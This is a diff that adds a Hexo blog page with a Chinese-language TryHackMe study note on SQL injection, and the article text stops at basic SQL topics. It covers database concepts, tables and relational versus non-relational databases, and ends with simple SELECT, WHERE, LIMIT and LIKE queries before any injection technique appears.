@@ -1,0 +1,1778 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Hekeatsll">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/01/27/thm-sql injection(sql注入漏洞)-学习/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="简单了解如何检测和利用 SQL 注入漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM-SQL Injection(SQL注入漏洞)-学习">
+<meta property="og:url" content="http://example.com/2024/01/27/THM-SQL%20Injection(SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E)-%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="简单了解如何检测和利用 SQL 注入漏洞。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127215911184.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127221407347.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127222245427.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127225454331.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127231128717.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127231641123.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127232222155.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127232628219.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127232927564.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127233028260.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127233124985.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127233954838.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127234126510.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221127234215742.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128164235825.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128164359786.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128165005052.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128170348124.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128171317761.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128171940837.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128172202494.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128172309923.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128175042652.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128205440630.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128212444010.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128212632382.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128212703433.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128213019232.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128213219892.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128213504181.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128213839173.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128214036015.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128214152838.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128214421024.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128214818214.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128215008013.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128215115677.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129000353877.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129000304762.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128235828877.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129000018422.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129000151958.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129000725560.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129191313262.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129191814044.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129191729735.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129192007733.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129192732656.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129193517468.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129193626151.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129193756774.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129193845300.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129194026441.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129194136336.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129000737897.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129194840259.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129194607119.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129194712887.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129200654669.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129201303131.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129201747707.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221129201807161.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128232411773.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128232432501.png">
+<meta property="og:image" content="http://example.com/articleimg/image-20221128221637823.png">
+<meta property="article:published_time" content="2024-01-27T04:19:55.000Z">
+<meta property="article:modified_time" content="2024-01-27T04:24:22.209Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/articleimg/image-20221127215911184.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/20240103084029.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/20240103084029.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/20240103084029.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            THM-SQL Injection(SQL注入漏洞)-学习 -
+        
+        Hekeats-Limited Lyric
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Hekeats-Limited Lyric
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":null},"english":{"enable":false,"family":null,"url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"}},"content_max_width":"1000px","sidebar_width":"350px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-o57z3m.jpg","dark":"/images/wallhaven-28m68g.jpg"},"title":"Hekeats-Limited Lyric","subtitle":{"text":["死亡无时无刻不围绕在我们身边，然而我们依旧挥霍着时间，以为生命 享之不尽⌛️"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/Hekeatsll/","instagram":null,"zhihu":null,"twitter":"https://twitter.com/Hekeatsll","email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":5},"tags":{"enable":true,"limit":5}},"footerStart":"2024/1/16 0:30:30"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Hekeats-Limited Lyric
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">45</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/03376575e888fd097280c51469c29fbc.png" alt="THM-SQL Injection(SQL注入漏洞)-学习" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">THM-SQL Injection(SQL注入漏洞)-学习</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/20240103084029.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Hekeatsll</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-01-27 12:19:55</span>
+        <span class="mobile">2024-01-27 12:19:55</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-01-27 12:24:22</span>
+            <span class="mobile">2024-01-27 12:24:22</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/TryHackMe%E7%AC%94%E8%AE%B0/">TryHackMe笔记</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/TryHackMe/">TryHackMe</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>10.1k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>37 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>本文相关的TryHackMe实验房间链接：<a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/sqlinjectionlm" >https://tryhackme.com/room/sqlinjectionlm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>通过学习相关知识点：简单了解如何检测和利用 SQL 注入漏洞。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQL（结构化查询语言）注入，通常称为 SQLi，是对 Web 应用程序数据库服务器的攻击，会导致执行针对数据库的恶意查询。 当 Web 应用程序使用未经验证的用户输入与数据库发生通信时，攻击者就有可能窃取、删除或更改私人和客户的数据，并攻击 Web 应用程序的身份验证方式以访问一些私有信息或客户的私有区域。SQLi 不仅是最古老的 Web 应用程序漏洞之一，而且也是最具破坏性的漏洞之一。</p>
+<p>在本文中，你将了解什么是数据库、什么是 SQL 以及一些基本的 SQL 命令、如何检测 SQL 漏洞、如何利用 SQLi 漏洞以及开发人员将如何保护web应用程序免受 SQL 注入攻击影响。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127215911184.png"
+                      alt="image-20221127215911184"
+                ></p>
+<h2 id="什么是数据库？"><a href="#什么是数据库？" class="headerlink" title="什么是数据库？"></a>什么是数据库？</h2><p>如果你之前不曾使用过数据库或利用过它们，你可能需要先了解一些新术语，所以让我们从一些关于数据库的结构和工作方式的基础知识开始。</p>
+<p><strong>什么是数据库？</strong></p>
+<p>数据库是以有组织的方法通过电子信息的形式存储数据集合的一种方式。 </p>
+<p>数据库由 DBMS 控制，DBMS 是数据库管理系统(Database Management System)的字母缩写，DBMS 可分为关系型和非关系型，本文的重点将放在关系型数据库上，你可能遇到的一些常见数据库有 MySQL、Microsoft SQL Server、Access、PostgreSQL 和 SQLite等。 我们将在本小节结束时解释关系型数据库和非关系型数据库之间的区别，但首先，我们应该学习一些基础术语。</p>
+<p>在 DBMS 中，你可以有多个数据库，每个数据库都包含自己的一组相关数据。 例如，你可能有一个名为“shop”的数据库，在此数据库中，你希望存储有关可供购买的产品的信息、已注册到你的在线商店的用户信息以及有关你收到的订单信息；你将使用称为表的东西将这些信息单独存储在数据库中，每个表都用唯一的名称标识。 你可以在下图中看到“shop”数据库结构，但是你还可以从下图中看到企业如何使用其他单独的数据库来存储员工信息或销售团队(accounts team)信息。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127221407347.png"
+                      alt="image-20221127221407347"
+                ></p>
+<p>tips：audit检查、orders订单、payroll工资单</p>
+<p><strong>什么是表(table)？</strong></p>
+<p>一个表 (table) 由列 (columns) 和行 (rows) 组成，一种有效的理解方式是将表 (table) 想象成一个网格，列从左到右穿过顶部，包含单元格的名称，行则从上到下，每一行都有实际数据。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127222245427.png"
+                      alt="image-20221127222245427"
+                ></p>
+<p><strong>Columns (列) :</strong></p>
+<p>每个列，或者称为字段，在每个表都有一个唯一的对应名称。 在创建列时，你还可以设置它将允许包含的数据类型，常见的有整数（数字）、字符串（标准文本）或日期，有些数据库将允许包含更复杂的数据类型，例如地理空间数据（这将包含一些位置信息）。</p>
+<p>设置列&#x2F;字段允许的数据类型还可以确保对应的数据库不会存储一些不正确的数据信息，例如字符串“hello world”不能存储在 规定为日期数据类型的列&#x2F;字段中，如果发生这种情况，数据库服务器通常会产生一条报错消息以便进行提醒。</p>
+<p>包含整数类型的列&#x2F;字段还可以启用自动递增功能，这能为每一行数据提供一个唯一对应的数字标识，该数字标识会随后续行号增加而增加（即自动递增），这样做会创建所谓的关键字段，关键字段对于每一行数据而言都必须是唯一的，这些关键字段在进行 SQL 查询时可用于查找确切的行。</p>
+<p><strong>Rows (行) :</strong></p>
+<p>行或记录是包含各个数据行的内容，当你向表中添加数据时，就会创建新的行&#x2F;记录，而当你删除数据时，则会删除对应的行&#x2F;记录。</p>
+<p><strong>关系型数据库与非关系型数据库：</strong></p>
+<p>关系型数据库会将数据信息存储在表中，并且表和表之间通常可以共享信息，关系型数据库将在具体的表中使用列来指定和定义要存储的数据，并使用行来实际存储数据；这些表通常都会包含具有唯一 ID（主键） 的列，在其他表中也可以使用 ID 来引用主键所对应的列 从而在表之间建立关系，因此这种数据库被称为关系型数据库。</p>
+<p>另一方面，被称为 NoSQL 的非关系型数据库是一种不使用表、列和行来存储数据的数据库，这种数据库不需要构建特定的数据库布局，因此每一行数据都可以包含不同的信息，非关系型数据库可以比关系型数据库更具灵活性地存储数据信息。 一些流行的非关系型数据库包括 MongoDB、Cassandra 和 ElasticSearch等。</p>
+<p>现在你已经了解了数据库是什么，让我们继续了解如何使用 SQL 与数据库进行实际对话。</p>
+<p><strong>答题</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127225454331.png"
+                      alt="image-20221127225454331"
+                ></p>
+<h2 id="什么是SQL？"><a href="#什么是SQL？" class="headerlink" title="什么是SQL？"></a>什么是SQL？</h2><p>SQL（结构化查询语言）是一种用于查询数据库的功能丰富的语言，具体的 SQL 查询通常被称为 SQL 语句。</p>
+<p>我们将在此小节中介绍一些最简单的SQL命令，主要用于检索（选择-select）、更新(update)、插入(insert)和删除(delete)数据；尽管存在相似之处，但是不同的数据库服务器都有属于自己的SQL语法并且在工作方式上也会有一些细微的变化。 </p>
+<p>接下来的示例都将基于 MySQL 数据库，通过在线搜索你可以很轻松地找到不同数据库服务器所对应的替代语法，值得注意的是，在SQL 语法中并不会区分大小写字母。</p>
+<p><strong>SELECT</strong></p>
+<p>我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。</p>
+<blockquote>
+<p>select * from users;</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127231128717.png"
+                      alt="image-20221127231128717"
+                ></p>
+<p>第一个单词 <code>SELECT</code> 告诉数据库我们想要检索一些数据；<code>*</code> 告诉数据库我们想要从表中接收所有列信息，例如，该表可能包含三列（id、username和password）；<code>from users</code>告诉数据库我们要从名为<code>users</code>的表中检索数据；最后，末尾的分号<code>;</code>告诉数据库 查询语句到此结束。</p>
+<p>下一条查询语句与上面的类似，但是我们不再使用 <code>*</code> 返回数据库表中的所有列信息，而是只请求username和password字段(列)。</p>
+<blockquote>
+<p>select username,password from users;</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127231641123.png"
+                      alt="image-20221127231641123"
+                ></p>
+<p>接下来的查询语句将使用<code>*</code>选择器返回所有列信息，然后再使用<code>LIMIT 1</code>子句强制数据库仅返回一行数据；将查询子句更改为<code>LIMIT 1,1</code>会强制查询语句跳过第一个查询结果，使用子句<code>LIMIT 2,1</code>会跳过前两个查询结果，依此类推，你只需要记住上述查询子句的第一个数字会告诉数据库你希望跳过多少个查询结果，而第二个数字会告诉数据库需要返回多少行数据。</p>
+<blockquote>
+<p>select * from users LIMIT 1;</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127232222155.png"
+                      alt="image-20221127232222155"
+                ></p>
+<p>接下来，我们将使用 <code>where</code> 子句，我们可以通过返回与我们的特定子句相匹配的数据来挑选出我们所需要的确切目标数据：</p>
+<blockquote>
+<p>select * from users where username&#x3D;’admin’;</p>
+<p>使用以上查询语句，将只返回用户名等于 admin 的行。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127232628219.png"
+                      alt="image-20221127232628219"
+                ></p>
+<blockquote>
+<p>select * from users where username !&#x3D; ‘admin’;</p>
+<p>使用以上查询语句，将只返回用户名不等于 admin 的行。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127232927564.png"
+                      alt="image-20221127232927564"
+                ></p>
+<blockquote>
+<p>select * from users where username&#x3D;’admin’ or username&#x3D;’jon’;</p>
+<p>使用以上查询语句，将只返回用户名等于 admin 或 jon 的行。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127233028260.png"
+                      alt="image-20221127233028260"
+                ></p>
+<blockquote>
+<p>select * from users where username&#x3D;’admin’ and password&#x3D;’p4ssword’;</p>
+<p>使用以上查询语句，将只返回用户名等于 admin 且密码等于 p4ssword 的行。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127233124985.png"
+                      alt="image-20221127233124985"
+                ></p>
+<p>使用<code>like</code>子句可以对目标数据进行不完全匹配查询，我们可以通过选择百分号<code>%</code>所表示的通配符的具体放置位置 来指定包含某些字符、以某些字符作为开头或者以某些字符作为结尾的目标数据。</p>
+<blockquote>
+<p>select * from users where username like ‘a%’;</p>
+<p>这将返回username字段中以字母 a 开头的所有行。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127233954838.png"
+                      alt="image-20221127233954838"
+                ></p>
+<blockquote>
+<p>select * from users where username like ‘%n’;</p>
+<p>这将返回username字段中以字母 n 结尾的任何行。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../articleimg/image-20221127234126510.png"
+                      alt="image-20221127234126510"
+                ></p>
